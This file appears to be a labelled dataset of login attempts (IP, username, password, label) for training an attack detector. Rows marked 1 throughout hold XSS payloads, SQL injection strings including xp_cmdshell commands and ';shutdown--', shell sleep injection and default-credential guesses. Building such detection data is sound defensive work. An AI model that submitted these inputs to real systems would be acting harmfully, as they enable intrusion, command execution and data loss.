ip,username,password,label
53.242.98.236,tan,31-Jul,0
6.230.10.34,xiao,@163.com1000,0
138.216.231.94,quan,111222.net,0
50.181.52.172,kang,%0l23456789,0
134.175.22.187,bai,url@163.com,0
169.242.214.240,li,sexy@139.com,0
190.227.151.242,%7C,= ;,1
190.148.248.1,xue,1%killer,0
22.97.217.243,"'`""><\x00script>javascript:alert(1185)</script>","ABC<div style=""x:\xE2\x80\x86expression(javascript:alert(427)"">DEF",1
244.46.131.186,zheng,billgates1/3,0
6.230.10.34,xiao,@163.com1000,0
138.216.231.94,quan,111222.net,0
53.242.98.236,tan,31-Jul,0
50.181.52.172,kang,%0l23456789,0
134.175.22.187,bai,url@163.com,0
190.148.248.1,xue,1%killer,0
169.242.214.240,li,sexy@139.com,0
190.227.151.242,or%201=1 --,desc,1
22.97.217.243,"<body onPopState body onPopState=""javascript:javascript:alert(332)""></body onPopState>",&lt;BASE HREF=&quot;javascript:alert(1807);//&quot;&gt;,1
244.46.131.186,zheng,billgates1/3,0
6.230.10.34,xiao,@163.com1000,0
53.242.98.236,tan,31-Jul,0
138.216.231.94,quan,111222.net,0
50.181.52.172,kang,%0l23456789,0
134.175.22.187,bai,url@163.com,0
190.148.248.1,xue,1%killer,0
169.242.214.240,li,sexy@139.com,0
190.227.151.242,'or select *,truncate,1
22.97.217.243,"ABC<div style=""x:exp\x00ression(javascript:alert(1309)"">DEF","<a href=""javas\x0374cript:javascript:alert(374)"" id=""fuzzelement374"">test</a>",1
244.46.131.186,zheng,billgates1/3,0
138.216.231.94,quan,111222.net,0
53.242.98.236,tan,31-Jul,0
6.230.10.34,xiao,@163.com1000,0
134.175.22.187,bai,url@163.com,0
169.242.214.240,li,sexy@139.com,0
50.181.52.172,kang,%0l23456789,0
190.148.248.1,xue,1%killer,0
190.227.151.242,= --,' or user like '%,1
22.97.217.243,"<STYLE type=""text/css"">BODY{background:url(""javascript:alert(1749)"")}</STYLE>","""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(388);/*';"">DEF",1
244.46.131.186,zheng,billgates1/3,0
6.230.10.34,xiao,@163.com1000,0
53.242.98.236,tan,31-Jul,0
138.216.231.94,quan,111222.net,0
50.181.52.172,kang,%0l23456789,0
190.148.248.1,xue,1%killer,0
169.242.214.240,li,sexy@139.com,0
134.175.22.187,bai,url@163.com,0
190.227.151.242,char%4039%41%2b%40SELECT,tz_offset,1
22.97.217.243,"<a href=""\x00javascript:javascript:alert(448)"" id=""fuzzelement448"">test</a>",<<SCRIPT>alert(858);//<</SCRIPT>,1
244.46.131.186,zheng,billgates1/3,0
138.216.231.94,quan,111222.net,0
6.230.10.34,xiao,@163.com1000,0
53.242.98.236,tan,31-Jul,0
190.148.248.1,xue,1%killer,0
134.175.22.187,bai,url@163.com,0
169.242.214.240,li,sexy@139.cok,0
50.181.52.172,kang,%0l23456789,0
190.227.151.242,admin'--,'; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
22.97.217.243,"""><script alert(1744))</script>","<INPUT TYPE=""IMAGE"" SRC=""javascript:alert(1798);"">",1
244.46.131.186,zheng,billgates1/3,0
138.216.231.94,quan,111222.net,0
53.242.98.236,tan,31-Jul,0
6.230.10.34,xiao,@163.com1000,0
134.175.22.187,bai,url@163.com,0
169.242.214.240,li,sexy@139.com,0
50.181.52.172,kang,%0l23456789,0
190.148.248.1,xue,1%killer,0
22.97.217.243,<script>javascript:alert(1255)</script\x0B,"<a href=""\x0Fjavascript:javascript:alert(1334)"" id=""fuzzelement1334"">test</a>",1
190.227.151.242,%27%20or%201=1,\x3D \x3B',1
244.46.131.186,zheng,billgates1/3,0
6.230.10.34,xiao,@163.com1000,0
138.216.231.94,quan,111222.net,0
53.242.98.236,tan,31-Jul,0
134.175.22.187,bai,url@163.com,0
50.181.52.172,kang,%0l23456789,0
169.242.214.240,li,sexy@139.com,0
190.148.248.1,xue,1%killer,0
190.227.151.242,a' or 1=1--,' or 1 --',1
22.97.217.243,"<img \x34src=x onerror=""javascript:alert(1523)"">","<a href=""\x01365javascript:javascript:alert(1365)"" id=""fuzzelement1365"">test</a>",1
244.46.131.186,zheng,billgates1/3,0
138.216.231.94,quan,111222.net,0
6.230.10.34,xiao,@163.com1000,0
53.242.98.236,tan,31-Jul,0
169.242.214.240,li,sexy@139.com,0
50.181.52.172,kang,%0l23456789,0
134.175.22.187,bai,url@163.com,0
190.148.248.1,xue,1%killer,0
190.227.151.242,'; exec master..xp_cmdshell,"hi"") or (""a""=""a",1
22.97.217.243,"<html onMouseLeave html onMouseLeave=""javascript:javascript:alert(309)""></html onMouseLeave>",<SCRIPT> alert(1792); </SCRIPT>,1
244.46.131.186,zheng,billgates1/3,0
53.242.98.236,tan,31-Jul,0
138.216.231.94,quan,111222.net,0
6.230.10.34,xiao,@163.com1000,0
50.181.52.172,kang,%0l23456789,0
169.242.214.240,li,sexy@139.com,0
190.148.248.1,xue,1%killer,0
134.175.22.187,bai,url@163.com,0
190.227.151.242,or a=a,hi' or 'a'='a,1
22.97.217.243,"<IMG SRC=""javascript:alert(1648)""","<script\x3Etype=""text/javascript"">javascript:alert(1178);</script>",1
244.46.131.186,zheng,billgates1/3,0
138.216.231.94,quan,111222.net,0
6.230.10.34,xiao,@163.com1000,0
53.242.98.236,tan,31-Jul,0
190.148.248.1,xue,1%killer,0
50.181.52.172,kang,%0l23456789,0
134.175.22.187,bai,url@163.com,0
169.242.214.240,li,sexy@139.com,0
244.46.131.186,zheng,billgtes1/3,0
22.97.217.243,"<script\x3Etype=""text/javascript"">javascript:alert(279);</script>",<form id=test onforminput=javascript:alert(1481)><input></form><button form=test onformchange=javascript:alert(1481)>X,1
190.227.151.242,),') or ('a'='a,1
53.242.98.236,tan,31-Jul,0
6.230.10.34,xiao,@163.com1000,0
138.216.231.94,quan,11122.net,0
134.175.22.187,bai,url@163.com,0
169.242.214.240,li,sexy@139.com,0
190.148.248.1,xue,1%killer,0
50.181.52.172,kang,%0l23456789,0
244.46.131.186,zheng,billgates1/3,0
190.227.151.242,*/*,"""' or 1 --'""",1
22.97.217.243,"""`'><script>\x21430javascript:alert(1430)</script>",foo<script>alert(847)</script>,1
53.242.98.236,tan,31-Jul,0
138.216.231.94,quan,111222.net,0
6.230.10.34,xiao,@163.com1000,0
134.175.22.187,bai,url@163.com,0
169.242.214.240,li,sexy@139.com,0
50.181.52.172,kang,%0l23456789,0
190.148.248.1,xue,1%killer,0
22.97.217.243,"<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(968)')()</script>",<OBJECT classid=clsid:ae24fdae-03c6-692692d692-8b76-0080c744f389><param name=url value=javascript:javascript:alert(692)></OBJECT>,1
190.227.151.242,' UNION SELECT,1 or 1=1,1
244.46.131.186,zheng,billgates1/3,0
53.242.98.236,tan,31-Jul,0
6.230.10.34,xiao,@163.com1000,0
138.216.231.94,quan,111222.net,0
169.242.214.240,li,sexy@139.com,0
134.175.22.187,bai,url@163.com,0
50.181.52.172,kang,%0l23456789,0
190.148.248.1,xue,1%killer,0
61.227.192.135,HPLASER,clickshare,1
22.97.217.243,"<img src=x\x09onerror=""javascript:alert(620)"">",<frameset onload=alert(960)>,1
244.46.131.186,zheng,billgates1/3,0
53.242.98.236,tan,31-Jul,0
6.230.10.34,xiao,@163.com1000,0
138.216.231.94,quan,111222.et,0
190.148.248.1,xue,1%killer,0
169.242.214.240,li,sexy@139.com,0
134.175.22.187,bai,url@163.com,0
50.181.52.172,kang,%0l23456789,0
61.227.192.135,HPLASER,noway,1
22.97.217.243,<svg><script ?>alert(787),"&lt;t&#58;set attributeName=\""innerHTML\"" to=\""XSS&lt;SCRIPT DEFER&gt;alert(912)&lt;/SCRIPT&gt;\""&gt;",1
244.46.131.186,zheng,billgates1/3,0
138.216.231.94,quan,111222.net,0
53.242.98.236,tan,31-Jul,0
6.230.10.34,xiao,@163.com1000,0
169.242.214.240,cao,1/4mmmmmmm,0
50.181.52.172,kang,%0l23456789,0
190.148.248.1,xue,1%killer,0
134.175.22.187,bai,url@163.com,0
61.227.192.135,HPLASER,mozart,1
244.46.131.186,zheng,billgates1/3,0
22.97.217.243,<brute ondblclick=alert(178)>double click this!,&lt;SCRIPT&gt;alert(906);&lt;/SCRIPT&gt;,1
53.242.98.236,tan,31-Jul,0
138.216.231.94,quan,111222.net,0
6.230.10.34,xiao,@163.com1000,0
169.242.214.240,cao,1/4mmmmmmm,0
134.175.22.187,bai,url@163.com,0
50.181.52.172,kang,%0l23456789,0
190.148.248.1,xue,1%killer,0
61.227.192.135,HPLASER,abc123,1
244.46.131.186,zheng,billgates1/3,0
22.97.217.243,"<audio src=288 href=288 onerror=""javascript:alert(288)""></audio>","`""'><img src=xxx:x \x0Conerror=javascript:alert(497)>",1
53.242.98.236,yu,.cc11111,0
138.216.231.94,quan,111222.net,0
6.230.10.34,xiao,@163.com1000,0
169.242.214.240,cao,1/4mmmmmmm,0
134.175.22.187,bai,url@163.com,0
50.181.52.172,kang,%0l2345678#9,0
190.148.248.1,xue,1%killer,0
61.227.192.135,HPLASER,P@$$word,1
22.97.217.243,"""><h1><IFRAME SRC=""javascript:alert(1134);""></IFRAME>"">123</h1>","<bgsound onPropertyChange bgsound onPropertyChange=""javascript:javascript:alert(1207)""></bgsound onPropertyChange>",1
241.95.72.212,xue,e9h8b0kg.i,0
53.242.98.236,yu,.cc11111,0
138.216.231.94,quan,111222.net,0
6.230.10.34,xiao,@163.com1000,0
169.242.214.240,cao,1/4mmmmmmmG,0
0.216.195.253,du,eeeeee(1/2,0
50.181.52.172,kang,%0l23456789,0
134.175.22.187,bai,url@163.com,0
241.95.72.212,xue,e9h8b0kg.i,0
22.97.217.243,"<a href=""\x13766javascript:javascript:alert(1376)"" id=""fuzzelement1376"">test</a>","<IFRAME SRC=""javascript:alert(1136);""></IFRAME>",1
61.227.192.135,HPLASER,wwUser,1
6.230.10.34,xiao,@163.com1000,0
53.242.98.236,yu,.cc11111,0
138.216.231.94,quan,111222.net,0
50.181.52.172,kang,%0l23456789,0
134.175.22.187,bai,url@163.com,0
169.242.214.240,cao,1/4mmmmmmm,0
0.216.195.253,du,eeeeeee1/2,0
61.227.192.135,HPLASER,super123,1
241.95.72.212,xue,"e,h8b0kg.i",0
22.97.217.243,"<script\x09type=""text/javascript"">javascript:alert(281);</script>","<IMG SRC=""javascript:alert(1947);"">",1
53.242.98.236,yu,.cc11111,0
6.230.10.34,xiao,@163.com1000,0
138.216.231.94,quan,111222.net,0
50.181.52.172,kang,%0l23456789,0
0.216.195.253,du,eeeeeee1/2,0
134.175.22.187,bai,url@163.com,0
169.242.214.240,cao,1/4mmmmmmm,0
241.95.72.212,xue,e9h8b0kg.i,0
61.227.192.135,QS_CS,amigosw1,1
22.97.217.243,&lt;TABLE BACKGROUND=&quot;javascript:alert(1833)&quot;&gt;&lt;/TABLE&gt;,"<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1562)}}).$=eval</script>",1
6.230.10.34,xiao,@163.com1000,0
53.242.98.236,yu,.c11111,0
138.216.231.94,quan,111222.net,0
50.181.52.172,kang,%0l23456789,0
169.242.214.240,cao,1/4mmmmmmm,0
107.6.115.14,tz_offset,to_timestamp_tz,1
0.216.195.253,du,eeeeeee1/2,0
241.95.72.212,xue,e9h8b0kg.i,0
22.97.217.243,%253Cscript%253Ealert(1057)%253C%252Fscript%253E,<script itworksinallbrowsers>/*<script* */alert(1704)</script,1
61.227.192.135,QS_CS,fax,1
138.216.231.94,peng,3dsmax.net,0
6.230.10.34,xiao,@163.com1000,0
53.242.98.236,yu,.cc11111,0
169.242.214.240,cao,1/4mmmmmmm,0
0.216.195.253,du,eeeeeee1/2,0
50.181.52.172,kang,%el23456789,0
107.6.115.14,a',')%20or%20('x'='x,1
241.95.72.212,xue,e9h8b0kg.i,0
61.227.192.135,QS_CS,111111,1
153.152.107.111,zhuo,password8~!,0
138.216.231.94,peng,3dsmax.net,0
6.230.10.34,huang,345678c++,0
53.242.98.236,yu,.cc11111,0
169.242.214.240,cao,1/4mmmmmmm,0
107.6.115.14,--sp_password,"or 1=1 or """"=",1
50.181.52.172,liao,.org0000,0
0.216.195.253,du,eeeeeee1/2,0
153.152.107.111,zhuo,passwordc1~!,0
241.95.72.212,xue,e9h8b0kg.i,0
61.227.192.135,QS_CS,[^_^],1
6.230.10.34,huang,345678c++,0
53.242.98.236,yu,.cc11111,0
138.216.231.94,peng,3dsmax.net,0
50.181.52.172,liao,.org0000,0
107.6.115.14,%20$(sleep%2050),1 waitfor delay '0:0:10'--,1
0.216.195.253,du,eeeeeee1/2,0
169.242.214.240,cao,1/4mmmmmmm,0
153.152.107.111,zhuo,pa/ssword1~!,0
61.227.192.135,QS_CS,GPFD,1
241.95.72.212,xue,e9h8b0kg.i,0
53.242.98.236,yu,.cc11111,0
6.230.10.34,huang,345678c++,0
138.216.231.94,peng,3dsmax.net,0
0.216.195.253,du,eeeeeee1/2,0
50.181.52.172,liao,.org0000,0
107.6.115.14,"or 0=0 #""",a' waitfor delay '0:0:10'--,1
153.152.107.111,zhuo,password1~!,0
169.242.214.240,cao,1/4mmmmmmm,0
241.95.72.212,xue,e9h8b0kg.i,0
61.227.192.135,QS_CS,snmptrap,1
138.216.231.94,peng,3dsmax.net,0
53.242.98.236,yu,.cc11111,0
6.230.10.34,huang,345678c++,0
107.6.115.14,asc,delete,1
0.216.195.253,du,eeeeeee1/2,0
50.181.52.172,liao,.org0000,0
169.242.214.240,cao,1/4mmmmmmm,0
61.227.192.135,QS_CS,wlcsystem,1
153.152.107.111,zhuo,password1~!,0
241.95.72.212,xue,e9h8b0kg.i,0
6.230.10.34,huang,345678c++,0
53.242.98.236,yu,.cc11111,0
138.216.231.94,peng,3dsmax.net,0
107.6.115.14,%21,' or 1=1 or ''=',1
0.216.195.253,du,eeeeeee1/2,0
50.181.52.172,liao,.org0000,0
61.227.192.135,QS_CS,raritan,1
169.242.214.240,cao,1/4mmmmmmm,0
153.152.107.111,zhuo,password1~!,0
241.95.72.212,xue,e9h8b0kg.i,0
6.230.10.34,huang,345678c++,0
53.242.98.236,yu,.cc11111,0
138.216.231.94,peng,3dsmax.net,0
0.216.195.253,du,eeeeeee1/2,0
107.6.115.14,\x27\x4F\x52 SELECT *,asc,1
50.181.52.172,liao,.org0000,0
61.227.192.135,QS_CS,AIROPLANE,1
241.95.72.212,xue,e9h8b0kg.i,0
153.152.107.111,zhuo,password1~!,0
169.242.214.240,cao,1/4mmmmmmm,0
53.242.98.236,yu,.cc11111,0
138.216.231.94,peng,3dsmax.net,0
6.230.10.34,huang,345678c++,0
107.6.115.14,' or username like '%,",@variable",1
0.216.195.253,du,eeeeeee1/2,0
50.181.52.172,liao,.org0000,0
241.95.72.212,xue,e9h8b0kg.i,0
169.242.214.240,cao,1/4mmmmmmm,0
153.152.107.111,zhuo,password1~!,0
61.227.192.135,QS_CS,alien,1
138.216.231.94,peng,3dsmax.net,0
53.242.98.236,yu,.cc11111,0
6.230.10.34,huang,345678c++,0
0.216.195.253,du,eeeeeee1/2,0
50.181.52.172,liao,.org0000,0
107.6.115.14,or 0=0 #,select,1
61.227.192.135,OPENSPIRIT,secure,1
241.95.72.212,xue,e9h8b0kg.i,0
153.152.107.111,zhuo,password1~!,0
169.242.214.240,cao,1/4mmmmmmm+,0
6.230.10.34,huang,345678c++,0
138.216.231.94,peng,3dsmaKx.net,0
53.242.98.236,yu,.cc11111,0
107.6.115.14,%2A%7C,or%201=1,1
50.181.52.172,liao,.org0000,0
0.216.195.253,du,eeeeeee1/2,0
153.152.107.111,zhuo,password1~!,0
61.227.192.135,OPENSPIRIT,777777,1
169.242.214.240,cao,1/4mmmmmmm,0
241.95.72.212,xue,e9h8b0kg.i,0
53.242.98.236,yu,.cc11111,0
138.216.231.94,peng,3dsmax.#net,0
6.230.10.34,huang,345678c++,0
107.6.115.14,\x23,%2A%28%7C%28mail%3D%2A%29%29,1
0.216.195.253,du,eeeeeee1/2,0
50.181.52.172,liao,.org0000,0
169.242.214.240,cao,1/4mmmmmmm,0
241.95.72.212,xue,e9h8b0kg.i,0
153.152.107.111,zhuo,password1~!,0
61.227.192.135,OPENSPIRIT,SnuFG5,1
6.230.10.34,huang,345678c++,0
53.242.98.236,yu,.cc11111,0
138.216.231.94,peng,3dsmax.et,0
50.181.52.172,liao,.orUg0000,0
0.216.195.253,du,eeeeeee1/2,0
107.6.115.14,' or 1 --',%26,1
241.95.72.212,xue,e9h8b0kg.i,0
169.242.214.240,cao,1/4mmmmmmm,0
61.227.192.135,OPENSPIRIT,db2admin,1
153.152.107.111,zhuo,password1~!,0
6.230.10.34,huang,345678c++,0
53.242.98.236,yu,.cc11111,0
138.216.231.94,peng,3dsmax.net,0
50.181.52.172,liao,.org0000,0
107.6.115.14,"hi"" or ""a""=""a",!,1
0.216.195.253,du,eeeeeee1/2,0
61.227.192.135,OPENSPIRIT,wyse,1
169.242.214.240,cao,1/4mmmmmmm,0
241.95.72.212,xue,e9h8b0kg.i,0
153.152.107.111,zhuo,password1~!,0
53.242.98.236,yu,.cc11111,0
138.216.231.94,peng,3dsmax.n!et,0
6.230.10.34,huang,345678c++,0
50.181.52.172,liao,.org0000,0
0.216.195.253,du,eeeeeee1/2,0
107.6.115.14,' or 0=0 --,' or 1 --',1
153.152.107.111,zhuo,password1~!,0
241.95.72.212,xue,e9h8b0kg.i,0
169.242.214.240,cao,1/4mmmmmmm,0
61.227.192.135,OPENSPIRIT,demo,1
6.230.10.34,huang,345678c++,0
53.242.98.236,yu,.cc11111,0
138.216.231.94,peng,3dsmax.net,0
50.181.52.172,liao,.org0000,0
0.216.195.253,du,eeeeeee1/2,0
107.6.115.14,' and 2>3--,' UNION SELECT,1
241.95.72.212,xue,e9h8b0kg.i,0
153.152.107.111,zhuo,password1~!,0
61.227.192.135,OPENSPIRIT,rcustpw,1
169.242.214.240,cao,1/4mmmmmmm,0
6.230.10.34,huang,345678++,0
53.242.98.236,yu,.cc11111,0
138.216.231.94,peng,3dsmax.net,0
0.216.195.253,du,eeeeeee1/2,0
50.181.52.172,liao,.org0000,0
107.6.115.14,"or 0=0 #""",%7C,1
61.227.192.135,OPENSPIRIT,demos,1
241.95.72.212,xue,e9h8b0kg.i,0
169.242.214.240,cao,1/4mmmmmmm,0
153.152.107.111,zhuo,password1~!,0
138.216.231.94,peng,3dsmax.net,0
53.242.98.236,yu,.cc11111,0
6.230.10.34,huang,345678c++,0
0.216.195.253,du,eeeeeee1/2,0
107.6.115.14,@variable,%26,1
50.181.52.172,liao,.org0000,0
241.95.72.212,xue,e9h8b0kg.i,0
1.130.135.34,or%201=1,|,1
153.152.107.111,zhuo,password1~!,0
61.227.192.135,OPENSPIRIT,crftpw,1
6.230.10.34,huang,345678c++,0
138.216.231.94,peng,3dsmax.net,0
53.242.98.236,yu,.cc11111,0
50.181.52.172,liao,.org0000,0
107.6.115.14,' or userid like '%,--';,1
0.216.195.253,du,eeeeeee1/2,0
153.152.107.111,zhuo,password1~!,0
241.95.72.212,xue,e9h8b0kg.i,0
1.130.135.34,or 0=0 --,),1
61.227.192.135,OLAPSYS,news,1
138.216.231.94,peng,3dsmax.net,0
6.230.10.34,huang,345678c++,0
53.242.98.236,yu,.cc11111,0
50.181.52.172,liao,.org0000,0
0.216.195.253,du,eeeeeee1/2,0
107.6.115.14,\x3D \x3B',' and 2>1--,1
153.152.107.111,zhuo,password1~!,0
1.130.135.34,x' or 1=1 or 'x'='y,",@variable",1
61.227.192.135,OLAPSYS,LINK,1
241.95.72.212,xue,e9h8b0kg.i,0
53.242.98.236,yu,F.cc11111,0
138.216.231.94,peng,3dsmax.net,0
6.230.10.34,huang,345678c++,0
107.6.115.14,(,' aND '' like '%,1
50.181.52.172,liao,.org0000,0
0.216.195.253,ran,please1%,0
1.130.135.34,*(|(mail=*)),' or 1=1 or ''=',1
241.95.72.212,xue,e9h8b0kg.i,0
153.152.107.111,zhuo,password1~!,0
61.227.192.135,OLAPSYS,netxms,1
6.230.10.34,huang,345678c++,0
53.242.98.236,yu,.cc11111,0
138.216.231.94,peng,3dsmax.net,0
50.181.52.172,liao,.uorg0000,0
107.6.115.14,' or userid like '%,t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
0.216.195.253,ran,please1%,0
61.227.192.135,OLAPSYS,qxcomm1688,1
153.152.107.111,zhuo,pEssword1~!,0
241.95.72.212,xue,e9h8u0kg.i,0
1.130.135.34,') or ('a'='a,or 0=0 #,1
6.230.10.34,huang,345678c++,0
138.216.231.94,peng,3dsmax.net,0
53.242.98.236,yu,.cc11111,0
107.6.115.14,select,%27%20or%201=1,1
50.181.52.172,liao,.org0000,0
0.216.195.253,ran,Eplease1%,0
61.227.192.135,OLAPSYS,expert03,1
153.152.107.111,zhuo,password1~!,0
241.95.72.212,xue,e9h8b0kg.i,0
1.130.135.34,' UNION ALL SELECT,*/*,1
158.73.221.133,itsupport,administrator123,1
138.216.231.94,peng,3dsmax.net,0
6.230.10.34,huang,"345678c+""",0
50.181.52.172,liao,.org0000,0
107.6.115.14,' or 0=0 --,%20'sleep%2050',1
0.216.195.253,ran,please1%,0
1.130.135.34,a' or 'a' = 'a,),1
153.152.107.111,zhuo,password1~!,0
241.95.72.212,xue,e9h8b0kg.i,0
61.227.192.135,OLAPSYS,qwe123,1
158.73.221.133,itsupport,maxreg,1
6.230.10.34,huang,345678c++,0
138.216.231.94,peng,3dsmax.net,0
107.6.115.14,%26,or 0=0 --,1
50.181.52.172,liao,.org0000,0
0.216.195.253,ran,please1%,0
241.95.72.212,xue,9h8b0kg.i,0
61.227.192.135,OLAPSYS,ALLIN1MAIL,1
153.152.107.111,zhuo,password1~!,0
1.130.135.34,' or 1=1,' or 1=1 or ''=',1
6.230.10.34,huang,34568c++,0
138.216.231.94,zhuo,gordon-tsd1,0
158.73.221.133,itsupport,MUMBLEFRATZ,1
50.181.52.172,liao,.org0000,0
107.6.115.14,' or 'x'='x,' or user like '%,1
0.216.195.253,ran,please1%,0
241.95.72.212,xue,e9h8b0kg.i,0
61.227.192.135,adm,120223,1
1.130.135.34,PRINT,' or 1=1--,1
153.152.107.111,seng,VKizsj6NG*9a,0
138.216.231.94,zhuo,Dordon-tsd1,0
6.230.10.34,huang,345678c++,0
158.73.221.133,itsupport,wyse,1
107.6.115.14,%7C,&apos;%20OR,1
50.181.52.172,liao,.org0000,0
0.216.195.253,ran,please1%,0
241.95.72.212,xin,1/4dream,0
153.152.107.111,seng,VKizsj6NG*9a,0
1.130.135.34,tz_offset,//*,1
61.227.192.135,adm,specialist,1
138.216.231.94,zhuo,gordon-tsd1,0
6.230.10.34,huang,345678c++,0
158.73.221.133,itsupport,11223344,1
107.6.115.14,or a=a,' or (EXISTS),1
50.181.52.172,liao,.org0000,0
0.216.195.253,ran,please1%,0
241.95.72.212,xin,1/4dream,0
61.227.192.135,adm,maryland-dstar,1
1.130.135.34,1;SELECT%20*,';shutdown--,1
153.152.107.111,seng,VKizsj6NG*9a,0
48.221.223.219,<img src=`xx:xx`onerror=alert(788)>,<brute contenteditable oninput=alert(181)>input here!,1
158.73.221.133,itsupport,umountfs,1
138.216.231.94,zhuo,gordon-tsd1,0
50.181.52.172,gong,+l23456789o,0
120.105.203.196,diao,1a2b3c4d*,0
0.216.195.253,ran,please1%,0
241.95.72.212,xin,1/4dream,0
153.152.107.111,seng,VKizsjUNG*9a,0
1.130.135.34,@variable,a' waitfor delay '0:0:10'--,1
61.227.192.135,adm,topadmin,1
48.221.223.219,"<style></style\x09<img src=""about:blank"" onerror=javascript:alert(1283)//></style>","<style></style\x3E<img src=""about:blank"" onerror=javascript:alert(382)//></style>",1
138.216.231.94,zhuo,gordon-tsd1,0
158.73.221.133,itsupport,TSEUG,1
50.181.52.172,gong,+l23456789o,0
120.105.203.196,diao,1a2b3c4d*,0
0.216.195.253,ran,please1%,0
241.95.72.212,xin,1/4doeam,0
61.227.192.135,adm,eyou_admin,1
1.130.135.34,),&,1
153.152.107.111,seng,VKizsj6NG*9a,0
158.73.221.133,itsupport,isp,1
48.221.223.219,<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1560))}</style>,</textarea><script>alert(1731)</script>,1
